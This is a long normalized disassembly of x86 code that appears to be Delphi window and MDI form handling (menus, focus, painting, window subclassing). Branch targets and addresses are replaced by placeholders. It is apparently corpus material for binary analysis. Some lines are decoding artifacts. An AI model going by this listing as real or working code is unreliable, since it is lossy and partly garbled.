mov eax [ rw-data ]
call sub_46b738
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_420a98
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46b738
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b748
call sub_403928
mov eax ebx
call sub_454120
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_453e1c
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_467e54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4680e9
lea eax [ ebp - 0x10 ]
call sub_403eec
retn
mov dl 0x1
mov eax ebx
call sub_468fe0
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_454120
test al al
je r-xdata
mov eax ebx
call sub_454120
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_453e1c
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_453e1c
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_453e1c
mov edx eax
mov eax esi
call sub_460fb4
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_453e1c
push eax
call SetMenu
sub_468104
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4680f0
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_468160
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_468154
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_4681cc
push ebx
mov ebx eax
mov eax ebx
call sub_453434
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_4681b4
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4681b4
mov edx eax
mov eax ebx
call sub_44d7d4
mov edx 0xff00000f
mov eax ebx
call sub_44d7d4
pop ebx
retn
sub_468250
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_453e1c
push eax
call ShowWindow
sub_468290
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_467ca8
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_467ca8
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_46b71c
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46b708
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_467ca8
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46b708
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_46b71c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_46b708
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_46b708
call sub_46b40c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46b708
call sub_46b3f0
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46b708
call sub_46b3d8
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_46b708
call sub_46b3d8
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46b708
call sub_46b3d8
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46b708
call sub_46b424
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_46b708
call sub_46b40c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46b708
call sub_46b3f0
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_46b708
call sub_46b3d8
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46b708
call sub_46b424
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_46b708
call sub_46b40c
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_46b708
call sub_46b40c
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_46b708
call sub_46b40c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46b708
call sub_46b3f0
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46b708
call sub_46b3d8
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46b708
call sub_46b424
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_46b708
call sub_46b3d8
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46b708
call sub_46b424
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_46b708
call sub_46b40c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46b708
call sub_46b3f0
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_4685e4
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_465aa0
mov edx esi
mov eax edi
call sub_46af88
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_468693 ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_450c40
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_450c40
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax r-xdata
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_4687f5
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_465ab0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
mov eax ebx
call sub_469154
push eax
push 0x1
push 0x80
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_44d038
push eax
mov eax ebx
call sub_44d07c
push eax
mov eax ebx
call sub_453e1c
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406ae0
mov [ ebx + 0x254 ] eax
push ebx
push sub_467740
call sub_421a58
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_45da68
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_453e1c
push eax
call SetWindowPos
jmp r-xdata
sub_468942
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_468a6d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_450fa4
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_46ae60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468a74
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_468a7c
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_451210
push 0x0
mov eax ebx
call sub_453e1c
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_468ac0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_451994
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_453e1c
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_453e1c
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_468b24
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_468bcc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468bd3
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
mov eax edi
call sub_464dc0
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403370
mov eax ebx
call sub_468edc
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403370
test al al
jne r-xdata
sub_468bdc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_4508f8
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_4508f8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_468b24
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_468c24
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_468b24
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_468c48
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_418444
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_418324
mov eax edi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_418444
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_418324
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push j_sub_4038f0#9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_453e1c
mov dx 0xb000
call sub_464b4c
test al al
jne r-xdata
call sub_453e1c
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_464b4c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468ebf
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_4039d4
jmp r-xdata
call sub_4039d4
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4508f8
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_453e1c
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_464b4c
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_44e7e8
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
call sub_4039d4
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_453e1c
mov dx 0xb01a
call sub_464b4c
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_4039d4
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_44e7e8
sub_468edc
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_44e7e8
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_453e1c
push eax
call SetFocus
mov eax ebx
call sub_453e1c
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_468f2c
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_44e7e8
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_468fe0
mov eax esi
call sub_468edc
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_454244
mov edx eax
mov eax esi
call sub_468b24
sub_468f90
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_467ba8
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_44e7e8
mov eax ebx
call sub_467ba8
mov edx esi
call sub_468f90
sub_468fe0
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_461594
mov edx esi
call sub_461578
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_469088
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
sub_4690d4
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_469088
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_469104
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_469088
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_469170
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_4246ac
xor eax eax
push ebp
push j_sub_4038f0#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_424af0
xor eax eax
push ebp
push j_sub_4038f0#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403370
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469202
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_424af0
retn
sub_46922c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_467ba8
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_467bdc
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403370
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_4530e4
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_467c28
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403370
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_4692cc
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_453e1c
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_453e1c
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_469154
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_453e1c
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_451fac
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_46934a
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_424244
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
